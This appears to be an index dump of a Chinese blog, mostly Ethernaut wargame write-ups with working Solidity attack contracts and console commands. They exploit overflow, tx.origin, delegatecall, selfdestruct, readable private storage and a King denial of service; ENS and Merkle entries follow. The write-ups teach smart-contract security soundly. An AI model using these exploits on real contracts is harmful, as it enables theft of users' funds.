Developer\n\n准备工作\nGet Rinkeby Test ETH\n\n题目解析\n0. Hello Ethernaut\n1. Fallback\n2. Fallout\n3. Coin Flip\n4. Telephone\n5. Token\n6. Delegation\n7. Force\n8. Vault\n9. King\n10. Re-entrancy\n\n","categories":["Web3"],"tags":["ethernaut"]},{"title":"使用 web3.py 扫描 ENS 域名","url":"/2022/05/05/web3-ens-scanner/","content":"最近 ENS 大火，数字域名成了抢手货，10k Club 已经被注册完了，接下来战场来到了 100K Club。\n为了能够扫描到还有哪些 ENS 域名未注册，我们需要一个工具。\n首选的工具肯定是 web3.py，它是一个 Python 库，可以用来扫描 ENS 域名。\n具体操作如下：\n安装 web3.py打开帮助文档快速开始\npip install web3\n\n注册 Infura由于我们需要访问 Ethereum 主网，所以需要配置 Web3 的 RPC 地址。前往 Infura 注册自己的账户，然后在页面右上角复制地址。\n使用 Web3from web3 import Web3from ens import ENSw3 = Web3(Web3.HTTPProvider(&#x27;https://&lt;your-provider-url&gt;&#x27;))# w3 = Web3(Web3.WebsocketProvider(&#x27;wss://&lt;your-provider-url&gt;&#x27;))ens = ENS.fromWeb3(w3)owner = ens.owner(&#x27;xwaer.eth&#x27;)print(owner)\n填写你的 Infura 地址，然后执行代码，查看结果。\n这个时候会返回这个 ENS 的 owner 地址。\n如果需要 ENS 的更多方法，可以查看 ENS API。\n扫描 ENS 域名这里我以扫描100k 以内的质数为例。\nfrom web3 import Web3from ens import ENSimport timeimport osw3 = Web3(Web3.HTTPProvider(&#x27;https://&lt;your-provider-url&gt;&#x27;))# w3 = Web3(Web3.WebsocketProvider(&#x27;wss://&lt;your-provider-url&gt;&#x27;))ens = ENS.fromWeb3(w3)owner = ens.owner(&#x27;xwaer.eth&#x27;)print(owner)origin_file = open(&quot;primes-to-100k.txt&quot;)unavailable_file = open(&quot;unavailable.txt&quot;, &quot;a+&quot;)available_file = open(&quot;available.txt&quot;, &quot;a+&quot;)line = origin_file.readline()while line:    print(line)    line = line.strip()    owner = ens.owner(line + &#x27;.eth&#x27;)    if owner == &#x27;0x0000000000000000000000000000000000000000&#x27;:        available_file.write(line + &#x27;\\n&#x27;)    else:        unavailable_file.write(line + &#x27;\\t&#x27; + owner + &#x27;\\n&#x27;)    os.sync()    time.sleep(0.1)    line = origin_file.readline()\n判断是否注册可以判断 owner 是否为 0x0000000000000000000000000000000000000000 地址。\n","categories":["Web3"],"tags":["ENS"]},{"title":"1. Fallback","url":"/2022/05/19/1-Fallback/","content":"Difficulty: 1&#x2F;10Level: https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008\n先看通关要求：\n\n\nyou claim ownership of the contract\nyou reduce its balance to 0\n\n\n\n\n再分析合约代码，要成为合约的owner，有两种方式：\n第一种\n...contributions[msg.sender] += msg.value;if(contributions[msg.sender] &gt; contributions[owner]) &#123;\towner = msg.sender;&#125;...\n\n现在合约的owner初始化写入 contributions[msg.sender] = 1000 * (1 ether);，也就是说需要传入大于 owner 的数量，但是 contribute 函数中已定义 require(msg.value &lt; 0.001 ether); 所以此方法行不通。\n第二种\n最下方有一段跟其他函数不一样的代码，前面没有 function关键字，而是以 receive() 开头。这里有一个知识点 fallback function:\n\nThe fallback function is executed on a call to the contract if none of the other functions match the given function signature, or if no data was supplied at all and there is no receive Ether function. The fallback function always receives data, but in order to also receive Ether it must be marked payable.\n\n也就是说，如果我们调用一个合约时函数签名不一致，或者函数名称不正确，就会直接运行这个 fallback function。\n分析这个合约里的 fallback function 的代码:\nreceive() external payable &#123;  require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);  owner = msg.sender;&#125;\n\n只需要达成 msg.value &gt; 0 和 contributions[msg.sender] &gt; 0 两个条件，msg.sender 就会被设定成 owner。\nmsg.value 可以在调用合约时控制。\n而另外一个条件需要再分析下代码：contributions 是一个 mapping，需要写入数据才能调用，而在 contribute 函数中有写入数据能力，分析 contribute 函数可知，以msg.value &lt; 0.001 ether 调用 contribute 函数，可令 contributions[msg.sender] &gt; 0。打开 Console(F12)，输入:\n&gt; contract.contribute(&#123;value: toWei(&quot;0.00001&quot;)&#125;)\n\n由于1 ether&#x3D; 10^18^ wei，这里使用了预设的 toWei  函数将 0.00001 ether 转换成 wei 单位发送。\n待交易确认后，再调用 fallback：\n&gt; contract.sendTransaction(&#123;value: toWei(&quot;0.00001&quot;)&#125;)\n\n此时 owner 已经转为 msg.sender。\n再调用 withdraw 函数把balance 归零：\n&gt; contract.withdraw()\n\n最后提交，本关完成。\n","categories":["Web3"],"tags":["ethernaut"]},{"title":"2. Fallout","url":"/2022/07/11/2-Fallout/","content":"Difficulty: 2&#x2F;10Level: https://ethernaut.openzeppelin.com/level/0x5732B2F88cbd19B6f01E3a96e9f0D90B917281E5\n先看通关要求：获取合约所有权\n分析代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;contract Fallout &#123;    using SafeMath for uint256;  mapping (address =&gt; uint) allocations;  address payable public owner;  /* constructor */  function Fal1out() public payable &#123;    owner = msg.sender;    allocations[owner] = msg.value;  &#125;  modifier onlyOwner &#123;\t        require(\t            msg.sender == owner,\t            &quot;caller is not the owner&quot;\t        );\t        _;\t    &#125;  function allocate() public payable &#123;    allocations[msg.sender] = allocations[msg.sender].add(msg.value);  &#125;  function sendAllocation(address payable allocator) public &#123;    require(allocations[allocator] &gt; 0);    allocator.transfer(allocations[allocator]);  &#125;  function collectAllocations() public onlyOwner &#123;    msg.sender.transfer(address(this).balance);  &#125;  function allocatorBalance(address allocator) public view returns (uint) &#123;    return allocations[allocator];  &#125;&#125;\n\n直接调用函数：\ncontract.Fal1out()\n\n此题背后的故事：\n\nRubixi的故事在以太坊生态中非常知名。 这个公司把名字从 ‘Dynamic Pyramid’ 改成 ‘Rubixi’ 但是不知道怎么地，他们没有把合约的 constructor 方法也一起更名：contract Rubixi {  address private owner;  function DynamicPyramid() { owner &#x3D; msg.sender; }  function collectAllFees() { owner.transfer(this.balance) }  …这让攻击者可以调用旧合约的constructor 然后获得合约的控制权，然后再获得一些资产。是的，这些重大错误在智能合约的世界是有可能的。\n\n以前的合约使用和合约同名的函数作为constructor使用，所以才会有这一题。而经过语法改善，现在已经用constructor 关键字来定义。\n最后提交，本关完成。\n","categories":["Web3"],"tags":["ethernaut"]},{"title":"实现无法交易转账的Token","url":"/2022/10/07/Non-Transferable-Token/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;@openzeppelin/contracts/token/ERC721/ERC721.sol&quot;;import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;contract Xwal is ERC721, Ownable &#123;    error NonTransferableToken();    constructor() ERC721(&quot;xwal&quot;, &quot;xwalNFT&quot;) &#123;&#125;    function _baseURI() internal pure override returns (string memory) &#123;        return &quot;https://arweave.net/E7rz7sKa1wWxKlMeFVrtZHgRjGMdDadDkT4QF2vDDkw/&quot;;    &#125;    function safeMint(address to, uint256 tokenId) public onlyOwner &#123;        _safeMint(to, tokenId);    &#125;    function _beforeTokenTransfer(        address from,        address to,        uint256 tokenId    ) override internal virtual &#123;        if (from != address(0) &amp;&amp; to != address(0)) &#123;            revert NonTransferableToken();        &#125;    &#125;&#125;\n覆盖 _beforeTokenTransfer 方法即可。\n","categories":["Web3"],"tags":["Solidity"]},{"title":"3. Coin Flip","url":"/2022/07/11/3-Coin-Flip/","content":"Difficulty: 3&#x2F;10Level: https://ethernaut.openzeppelin.com/level/0x4dF32584890A0026e56f7535d0f2C6486753624f\n先看通关要求：\n\n这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。\n\n分析合约代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;contract CoinFlip &#123;  using SafeMath for uint256;  uint256 public consecutiveWins;  uint256 lastHash;  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;  constructor() public &#123;    consecutiveWins = 0;  &#125;  function flip(bool _guess) public returns (bool) &#123;    uint256 blockValue = uint256(blockhash(block.number.sub(1)));    if (lastHash == blockValue) &#123;      revert();    &#125;    lastHash = blockValue;    uint256 coinFlip = blockValue.div(FACTOR);    bool side = coinFlip == 1 ? true : false;    if (side == _guess) &#123;      consecutiveWins++;      return true;    &#125; else &#123;      consecutiveWins = 0;      return false;    &#125;  &#125;&#125;\n\n本关使用 block number 作为随机数，计算 div，然后和 _guess 进行比较。\n由此可知只要保证调用方和被调用方的block number 相同就可以计算出结果。\n个人钱包调用不能保证block number相同，需要单独写一个合约调用CoinFlip合约即可。\n解题获取关卡合约实例地址：\ninstance\n\n打开 Remix IDE，新建文件 CoinFlip.sol：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.9;import &#x27;@openzeppelin/contracts/utils/math/SafeMath.sol&#x27;;interface ICoinFlip &#123;    function flip(bool _guess) external returns (bool);&#125;contract CoinFlip &#123;    using SafeMath for uint256;    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    address levelInstance;  constructor(address _levelInstance) &#123;      levelInstance = _levelInstance;  &#125;  function guess() public &#123;    uint256 blockValue = uint256(blockhash(block.number.sub(1)));    uint256 coinFlip = blockValue.div(FACTOR);    bool side = coinFlip == 1 ? true : false;    if (side == true) &#123;        ICoinFlip(levelInstance).flip(true);    &#125; else &#123;        ICoinFlip(levelInstance).flip(false);    &#125;  &#125;&#125;\n\n编译部署，在 constructor 填入关卡合约地址然后部署。\n然后分别在10个区块中调用 guess 函数。\n最后提交，本关完成。\n后续通过solidity产生随机数没有那么容易. 目前没有一个很自然的方法来做到这一点, 而且你在智能合约中做的所有事情都是公开可见的, 包括本地变量和被标记为私有的状态变量. 矿工可以控制 blockhashes, 时间戳, 或是是否包括某个交易, 这可以让他们根据他们目的来左右这些事情.\n想要获得密码学上的随机数,你可以使用 Chainlink VRF, 它使用预言机, LINK token, 和一个链上合约来检验这是不是真的是一个随机数.\n一些其它的选项包括使用比特币block headers (通过验证 BTC Relay), RANDAO, 或是 Oraclize).\n","categories":["Web3"],"tags":["ethernaut"]},{"title":"4. Telephone","url":"/2022/10/11/4-Telephone/","content":"Chain: GoerliDifficulty: ●○○○○Level: https://ethernaut.openzeppelin.com/level/0x466BDd41a04473A01031C9D80f61A9487C7ef488\n通关要求创建当前关卡合约实例后，调用 await contract.owner() 发现 owner 并不是当前钱包地址。那通过要求就是将 owner 变更为当前钱包。\n分析合约// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Telephone &#123;  address public owner;  constructor() public &#123;    owner = msg.sender;  &#125;  function changeOwner(address _owner) public &#123;    if (tx.origin != msg.sender) &#123;      owner = _owner;    &#125;  &#125;&#125;\n\n在 constructor 构造函数中可以看出，owner 是通过 msg.sender 进行初始化。\n在 changeOwner 函数中只有 tx.origin 和 msg.sender 不相等时，才将 owner 赋值。\n至此，引出两个不同的变量 tx.origin 和 msg.sender ：\ntx.origin： 指调用智能合约功能的账户地址，只有账户地址可以是 tx.origin\nmsg.sender ：指直接调用智能合约功能的帐户或智能合约的地址。\n当以智能合约调用智能合约时，msg.sender 在被调用的智能合约中，会是调用者智能合约的地址，而 tx.origin 则是最初调用智能合约的个人钱包地址。\n所以，在创建当前关卡合约实例时，是通过关卡合约进行创建，当部署 Telephone 这个合约时，msg.sender 的值为当前关卡合约地址，而不是当前钱包地址。\n解题实现\n首先打开Console，获取当前关卡合约实例地址 instance；\n\n打开 Remix IDE，创建文件 Telephone.sol，粘贴以下代码：\n // SPDX-License-Identifier: MITpragma solidity ^0.8.4;interface ITelephone &#123;    function changeOwner(address _owner) external;&#125;contract Telephone &#123;    address levelInstance;        constructor(address _levelInstance) &#123;        levelInstance = _levelInstance;    &#125;    function changeOwner() public &#123;        ITelephone(levelInstance).changeOwner(msg.sender);    &#125;&#125;\n\n在constructor 填入当前关卡合约实例地址后部署。\n\n再调用 changeOwner 函数，完成关卡。\n\n\n后记这个例子比较简单, 混淆 tx.origin 和 msg.sender 会导致 phishing-style 攻击, 比如this.\n下面描述了一个可能的攻击.\n\n使用 tx.origin 来决定转移谁的token, 比如.\n function transfer(address _to, uint _value) &#123;  tokens[tx.origin] -= _value;  tokens[_to] += _value;&#125;\n\n攻击者通过调用合约的 transfer 函数是受害者向恶意合约转移资产, 比如\n function () payable &#123;  token.transfer(attackerAddress, 10000);&#125;\n\n在这个情况下, tx.origin 是受害者的地址 ( msg.sender 是恶意协议的地址), 这会导致受害者的资产被转移到攻击者的手上.\n\n\n","categories":["Web3"],"tags":["ethernaut"]},{"title":"5. Token","url":"/2022/10/26/5-Token/","content":"Chain: GoerliDifficulty: ●●○○○Level: https://ethernaut.openzeppelin.com/level/0xDc0c34CFE029b190Fc4A6eD5219BF809F04E57A3\n要求这一关的目标是攻破下面这个基础 token 合约你最开始有20个 token，如果你通过某种方法可以增加你手中的 token 数量，你就可以通过这一关，当然越多越好。这可能有帮助:什么是 odometer?\n分析// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token &#123;  mapping(address =&gt; uint) balances;  uint public totalSupply;  constructor(uint _initialSupply) public &#123;    balances[msg.sender] = totalSupply = _initialSupply;  &#125;  function transfer(address _to, uint _value) public returns (bool) &#123;    require(balances[msg.sender] - _value &gt;= 0);    balances[msg.sender] -= _value;    balances[_to] += _value;    return true;  &#125;  function balanceOf(address _owner) public view returns (uint balance) &#123;    return balances[_owner];  &#125;&#125;\n\n我们可以看到 transfer 函数的require 检查代码：\nrequire(balances[msg.sender] - _value &gt;= 0); \n由于 balances[msg.sender] 和 _value 都是 uint 类型，balances[msg.sender] - _value 的结果也是 uint ，作为无符号整数永远是大于等于 0 的，导致我们可以任意取款。正确的写法是 require(balances[msg.sender] &gt;= _value) 。\n找到入侵点后，接下来再分析数据。\n当前token数：\n\ntotalSupply: 21000000\nplayer: 20\nlevel: 20999980\n\n题目中提到数量越多越好，balances 的类型是 uint ，最大值为2**256 -1，因此我们需要将value 变为最大值即可。\n解题\n首先打开Console，获取当前关卡合约实例地址 instance；\n\n打开 Remix IDE，创建文件 5_Token.sol，粘贴以下代码：\n // SPDX-License-Identifier: MITpragma solidity ^0.8.4;interface IToken &#123;    function transfer(address _to, uint256 _value) external returns (bool);&#125;contract HackToken &#123;    address levelInstance;    constructor(address _levelInstance) &#123;        levelInstance = _levelInstance;    &#125;    function claim() public &#123;        IToken(levelInstance).transfer(msg.sender, type(uint256).max - 20);    &#125;&#125;\n 其中value的值为 type(uint256).max - 20 。\n\n在constructor 填入当前关卡合约实例地址后部署。\n\n再调用 claim 函数，完成关卡。\n\n\n后记EVM 的整数有 int 和 uint 两种，对应有无符号的情况。在 int 或 uint 后可以跟随一个 8 的倍数，表示该整数的位数，如 8 位的 uint8。位数上限为 256 位，int 和 uint 分别是 int256 和 uint256 的别名，一般 uint 使用的更多。\n在整数超出位数的上限或下限时，就会静默地进行取模操作。通常我们希望费用向上溢出变小，或者存款向下溢出变大。整数溢出漏洞可以使用 SafeMath 库来防御，当发生溢出时会回滚交易。\nOverflow 在 solidity 中非常常见, 你必须小心检查, 比如下面这样:\nif(a + c &gt; a) &#123;  a = a + c;&#125;\n\n另一个简单的方法是使用 OpenZeppelin 的 SafeMath 库, 它会自动检查所有数学运算的溢出, 可以像这样使用:\na = a.add(c);\n\n如果有溢出，代码会自动恢复。\n","categories":["Web3"],"tags":["ethernaut"]},{"title":"6. Delegation","url":"/2022/11/01/6-Delegation/","content":"Chain: GoerliDifficulty: ●●○○○Level: https://ethernaut.openzeppelin.com/level/0x31C4D3a9e0ED12A409cF3C84ad145331aB487D3F\n要求这一关的目标是申明你对你创建实例的所有权.\n这可能有帮助\n\n仔细看solidity文档关于 delegatecall 的低级函数, 他怎么运行的, 他如何将操作委托给链上库, 以及他对执行的影响.\nFallback 方法\n方法 ID\n\n分析// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Delegate &#123;  address public owner;  constructor(address _owner) public &#123;    owner = _owner;  &#125;  function pwn() public &#123;    owner = msg.sender;  &#125;&#125;contract Delegation &#123;  address public owner;  Delegate delegate;  constructor(address _delegateAddress) public &#123;    delegate = Delegate(_delegateAddress);    owner = msg.sender;  &#125;  fallback() external &#123;    (bool result,) = address(delegate).delegatecall(msg.data);    if (result) &#123;      this;    &#125;  &#125;&#125;\n\n首先我们根据解题提示和分析合约，有3个知识点。以下内容引用自：WTF Academy\ndelegatecall 和 calldelegatecall与call类似，是solidity中地址类型的低级成员函数。\n当用户A通过合约B来call合约C的时候，执行的是合约C的函数，语境(Context，可以理解为包含变量和状态的环境)也是合约C的：msg.sender是B的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约C的变量上。\n\n而当用户A通过合约B来delegatecall合约C的时候，执行的是合约C的函数，但是语境仍是合约B的：msg.sender是A的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约B的变量上。\n\n大家可以这样理解：一个富商把它的资产（状态变量）都交给一个VC代理（目标合约的函数）来打理。执行的是VC的函数，但是改变的是富商的状态。\ndelegatecall语法和call类似，也是：\n目标合约地址.delegatecall(二进制编码);\n\n其中二进制编码利用结构化编码函数abi.encodeWithSignature获得：\nabi.encodeWithSignature(&quot;函数签名&quot;, 逗号分隔的具体参数)\n\n函数签名为&quot;函数名（逗号分隔的参数类型)&quot;。例如abi.encodeWithSignature(&quot;f(uint256,address)&quot;, _x, _addr)。\n和call不一样，delegatecall在调用合约时可以指定交易发送的gas，但不能指定发送的ETH数额\n\n注意：delegatecall有安全隐患，使用时要保证当前合约和目标合约的状态变量存储结构相同，并且目标合约安全，不然会造成资产损失。\n\nFallbackfallback()函数会在调用合约不存在的函数时被触发。可用于接收ETH，也可以用于代理合约proxy contract。fallback()声明时不需要function关键字，必须由external修饰，一般也会用payable修饰，用于接收ETH:fallback() external payable &#123; ... &#125;。\n我们定义一个fallback()函数，被触发时候会释放fallbackCalled事件，并输出msg.sender，msg.value和msg.data:\n// fallbackfallback() external payable&#123;    emit fallbackCalled(msg.sender, msg.value, msg.data);&#125;\n\n方法 IDABI (Application Binary Interface，应用二进制接口)是与以太坊智能合约交互的标准。数据基于他们的类型编码；并且由于编码后不包含类型信息，解码时需要注明它们的类型。\nSolidity中，ABI编码有4个函数：abi.encode, abi.encodePacked, abi.encodeWithSignature, abi.encodeWithSelector。而ABI解码有1个函数：abi.decode，用于解码abi.encode的数据。\nabi.encode将给定参数利用ABI规则编码。ABI被设计出来跟智能合约交互，他将每个参数填充为32字节的数据，并拼接在一起。如果你要和合约交互，你要用的就是abi.encode。\nfunction encode() public view returns(bytes memory result) &#123;    result = abi.encode(x, addr, name, array);&#125;\n\nabi.encodePacked将给定参数根据其所需最低空间编码。它类似 abi.encode，但是会把其中填充的很多0省略。比如，只用1字节来编码uint类型。当你想省空间，并且不与合约交互的时候，可以使用abi.encodePacked，例如算一些数据的hash时。\nfunction encodePacked() public view returns(bytes memory result) &#123;    result = abi.encodePacked(x, addr, name, array);&#125;\n\nabi.encodeWithSignature与abi.encode功能类似，只不过第一个参数为函数签名，比如&quot;foo(uint256,address)&quot;。当调用其他合约的时候可以使用。\nfunction encodeWithSignature() public view returns(bytes memory result) &#123;    result = abi.encodeWithSignature(&quot;foo(uint256,address,string,uint256[2])&quot;, x, addr, name, array);&#125;\n\n等同于在abi.encode编码结果前加上了4字节的函数选择器。 说明: 函数选择器就是通过函数名和参数进行签名处理(Keccak–Sha3)来标识函数，可以用于不同合约之间的函数调用。\nabi.encodeWithSelector与abi.encodeWithSignature功能类似，只不过第一个参数为函数选择器，为函数签名Keccak哈希的前4个字节。\nfunction encodeWithSelector() public view returns(bytes memory result) &#123;    result = abi.encodeWithSelector(bytes4(keccak256(&quot;foo(uint256,address,string,uint256[2])&quot;)), x, addr, name, array);&#125;\n\n我们再来分析下合约，就很明了。通过触发合约的 fallback 调用 delegatecall 执行 pwn 方法，就可以将合约的owner更改为 player。\n解题\n首先打开Console，获取当前关卡合约实例地址 contract；\n\n执行JS，调用sendTransaction：\n contract.sendTransaction(&#123;data: web3.eth.abi.encodeFunctionSignature(&#x27;pwn()&#x27;)&#125;);\n\n最后提交，本关完成。\n\n\n后记使用delegatecall 是很危险的，而且历史上已经多次被用于进行 attack vector。使用它，你对合约相当于在说 “看这里， 其他合约或是其它库，来对我的状态为所欲为吧”。代理对你合约的状态有完全的控制权。 delegatecall 函数是一个很有用的功能，但是也很危险，所以使用的时候需要非常小心。\n请参见 The Parity Wallet Hack Explained 这篇文章, 他详细解释了这个方法是如何窃取三千万美元的。\n","categories":["Web3"],"tags":["ethernaut"]},{"title":"7. Force","url":"/2022/11/03/7-Force/","content":"Chain: GoerliDifficulty: ●●●○○Level: https://ethernaut.openzeppelin.com/level/0x20B5c742dD8A63400644Ba85dd48E8FDB6908A7A\n要求有些合约就是拒绝你的付款,就是这么任性 ¯\\_(ツ)_/¯\n这一关的目标是使合约的余额大于0\n这可能有帮助:\n\nFallback 方法\n有时候攻击一个合约最好的方法是使用另一个合约.\n阅读上方的帮助页面, “控制台之外” 部分\n\n分析// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Force &#123;/*                   MEOW ?         /\\_/\\   /    ____/ o o \\  /~____  =ø= / (______)__m_m)*/&#125;\n\n首先引入一个知识点 fallback。上一关已经简单介绍过 fallback方法，这次再扩展下。\nSolidity支持两种特殊的回调函数，receive()和fallback()，他们主要在两种情况下被使用：\n\n接收ETH\n处理合约中不存在的函数调用（代理合约proxy contract）\n\n接收ETH函数 receivereceive()只用于处理接收ETH。一个合约最多有一个receive()函数，声明方式与一般函数不一样，不需要function关键字：receive() external payable &#123; ... &#125;。receive()函数不能有任何的参数，不能返回任何值，必须包含external和payable。\n// 定义事件event Received(address Sender, uint Value);// 接收ETH时释放Received事件receive() external payable &#123;    emit Received(msg.sender, msg.value);&#125;\n\n回退函数 fallbackfallback()函数会在调用合约不存在的函数时被触发。可用于接收ETH，也可以用于代理合约proxy contract。fallback()声明时不需要function关键字，必须由external修饰，一般也会用payable修饰，用于接收ETH:fallback() external payable &#123; ... &#125;。\n// fallbackfallback() external payable&#123;    emit fallbackCalled(msg.sender, msg.value, msg.data);&#125;\n\nreceive和fallback的区别receive和fallback都能够用于接收ETH，他们触发的规则如下：\n触发fallback() 还是 receive()?           接收ETH              |         msg.data是空？            /  \\          是    否          /      \\receive()存在?   fallback()        / \\       是  否      /     \\receive()   fallback()\n\n简单来说，合约接收ETH时，msg.data为空且存在receive()时，会触发receive()；msg.data不为空或不存在receive()时，会触发fallback()，此时fallback()必须为payable。\nreceive()和payable fallback()均不存在的时候，向合约发送ETH将会报错。\n我们再来看 Force 合约，这里只定义了合约，没有定义 receive 和 fallback 方法，到这里从调用不存在的合约方法触发 fallback 走不通，那还有没有其他方法可以往一个合约转账，还真有一个方法 selfdestruct 。\nselfdestruct命令可以用来删除智能合约，并将该合约剩余ETH转到指定地址。selfdestruct是为了应对合约出错的极端情况而设计的。\nselfdestruct使用起来非常简单：\nselfdestruct(address payable recipient)\n\n其中recipient是接收合约中剩余ETH的地址。\ncontract DeleteContract &#123;    uint public value = 10;    constructor() payable &#123;&#125;    receive() external payable &#123;&#125;    function deleteContract() external &#123;        // 调用selfdestruct销毁合约，并把剩余的ETH转给msg.sender        selfdestruct(payable(msg.sender));    &#125;    function getBalance() external view returns(uint balance)&#123;        balance = address(this).balance;    &#125;&#125;\n\n解题\n首先打开Console，获取当前关卡合约实例地址 instance；\n\n打开 Remix IDE，创建文件 7_Force.sol，粘贴以下代码：\n // SPDX-License-Identifier: MITpragma solidity ^0.8.4;contract HackForce &#123;    address levelInstance;    constructor(address _levelInstance) payable &#123;        levelInstance = _levelInstance;    &#125;    function give() external payable &#123;        selfdestruct(payable(levelInstance));    &#125;&#125;\n\n在constructor 填入当前关卡合约实例地址后部署。VALUE 填入任意值。\n\n再调用 give 函数，完成关卡。\n\n\n后记在solidity中，如果一个合约要接受 ether，fallback 方法必须设置为 payable。\n但是，并没有发什么办法可以阻止攻击者通过自毁的方法向合约发送 ether, 所以, 不要将任何合约逻辑基于 address(this).balance == 0 之上。\n","categories":["Web3"],"tags":["ethernaut"]},{"title":"8. Vault","url":"/2022/11/03/8-Vault/","content":"Chain: GoerliDifficulty: ●●○○○Level: https://ethernaut.openzeppelin.com/level/0x78BA1a1DD8833A4a20ecAc0Db8f3aCD8A9211beD\n要求打开 vault 来通过这一关!\n分析// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Vault &#123;  bool public locked;  bytes32 private password;  constructor(bytes32 _password) public &#123;    locked = true;    password = _password;  &#125;  function unlock(bytes32 _password) public &#123;    if (password == _password) &#123;      locked = false;    &#125;  &#125;&#125;\n\n分析下合约代码，就是要获取合约的password值。虽然 password 是一个 private，不能直接调用合约取值，但我们可以通过 Web3的getStorageAt 函数可以取得指定地址特定位置的storage。\nweb3.eth.**getStorageAt**(address, position [, defaultBlock] [, callback])\nGet the storage at a specific position of an address.\nParameters\n\nString - The address to get the storage from.\nNumber|String|BN|BigNumber - The index position of the storage.\nNumber|String|BN|BigNumber - (optional) If you pass this parameter it will not use the default block set with web3.eth.defaultBlock. Pre-defined block numbers as &quot;earliest&quot;, &quot;latest&quot; , &quot;pending&quot;, &quot;safe&quot; or &quot;finalized&quot; can also be used.\nFunction - (optional) Optional callback, returns an error object as first parameter and the result as second.\n\nReturns\nPromise returns String - The value in storage at the given position.\n解题\n打开 Console 执行以下命令：\n await web3.eth.getStorageAt(instance, 1)\n 得到结果：0x412076657279207374726f6e67207365637265742070617373776f7264203a29\n 将该结果转换成字符串：await web3.utils.toAscii(&quot;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&quot;) ，可以得到：A very strong secret password :)\n\n调用合约代码：\n await contract.unlock(&quot;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&quot;)\n\n提交实例，完成关卡。\n\n\n后记请记住, 将一个变量设制成私有, 只能保证不让别的合约访问他. 设制成私有的状态变量和本地变量, 依旧可以被公开访问.\n为了确保数据私有, 需要在上链前加密. 在这种情况下, 密钥绝对不要公开, 否则会被任何想知道的人获得. zk-SNARKs 提供了一个可以判断某个人是否有某个秘密参数的方法,但是不必透露这个参数.\n","categories":["Web3"],"tags":["ethernaut"]},{"title":"9. King","url":"/2022/11/13/9-King/","content":"Chain: GoerliDifficulty: ●●●○○Level: https://ethernaut.openzeppelin.com/level/0x25141B6345378e7558634Cf7c2d9B8670baFA417\n要求下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.\n这么有趣的游戏, 你的目标是攻破他.\n当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.\n分析// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract King &#123;  address payable king;  uint public prize;  address payable public owner;  constructor() public payable &#123;    owner = msg.sender;      king = msg.sender;    prize = msg.value;  &#125;  receive() external payable &#123;    require(msg.value &gt;= prize || msg.sender == owner);    king.transfer(msg.value);    king = msg.sender;    prize = msg.value;  &#125;  function _king() public view returns (address payable) &#123;    return king;  &#125;&#125;\n\n分析合约代码，关键点在于 receive 函数中：\nking.transfer(msg.value);\n\n这里犯了常见的错误：未考虑调用者 king 为另一个合约的情况。如果该合约未定义 fallback() 和 receive() 函数，transfer() 就会失败，会自动revert（回滚交易）。\n因此只要有一个未定义 fallback() 和 receive() 函数的合约占用king，合约在 transfer 时失败，令king的地址永远属于该合约。\n另一个关键点是，King 合约的 receive 有复杂的逻辑， 而\nsolidity三种发送ETH的方法：transfer，send和call。\n\ncall没有gas限制，最为灵活，是最提倡的方法；\ntransfer有2300 gas限制，但是发送失败会自动revert交易，是次优选择；\nsend有2300 gas限制，而且发送失败不会自动revert交易，几乎没有人用它。\n\n因此只能用 call 函数进行调用。\n解题\n首先打开Console，获取当前关卡合约实例地址 instance；\n\n打开 Remix IDE，创建文件 9_King.sol，粘贴以下代码：\n // SPDX-License-Identifier: MITpragma solidity ^0.8.4;contract HackKing &#123;    error CallFailed();    address levelInstance;    constructor(address _levelInstance) payable &#123;        levelInstance = _levelInstance;    &#125;    function give() external payable &#123;        (bool success,) = levelInstance.call&#123;value: msg.value&#125;(&quot;&quot;);        if(!success)&#123;            revert CallFailed();        &#125;    &#125;&#125;\n\n在constructor 填入当前关卡合约实例地址后部署。\n\n再调用 give 函数：\n\n获取当前King 合约的 prize await getBalance(instance) 为 0.001 ether\nVALUE 需要大于或者等于 0.001 ether\n手动调高 GAS LIMIT，不然调用合约会因为 out of gas 失败\n\n\n查看 King 合约的king是否为HackKing 合约。\n\n完成关卡。\n\n\n后记大多数 Ethernaut 的关卡尝试展示真实发生的 bug 和 hack (以简化过的方式).\n关于这次的情况, 参见: King of the Ether 和 King of the Ether Postmortem\n","categories":["Web3"],"tags":["ethernaut"]},{"title":"默克尔树（Merkle Tree）","url":"/2022/11/09/merkle-tree/","content":"默克尔树默克尔树结构用很小的成本就能有效验证数据集的完整性。\n什么是Merkle树？默克尔树是一种树状结构，树上的每个节点都由一个值表示，这个值是一些加密哈希函数的结果。哈希函数是单向的，从一个输入产生一个输出很容易，但从一个输出确定一个输入在计算上是不可行的。默克尔树有3种类型的节点，如下所示：\n\n叶子节点 - 叶子节点位于树的最底部，它们的值是原始数据根据指定的哈希函数进行哈希的结果。一棵树上有多少个叶子节点，就有多少个需要哈希的原始数据。例如，如果有7个数据需要被哈希，就会有7个叶子节点。\n\n父节点 - 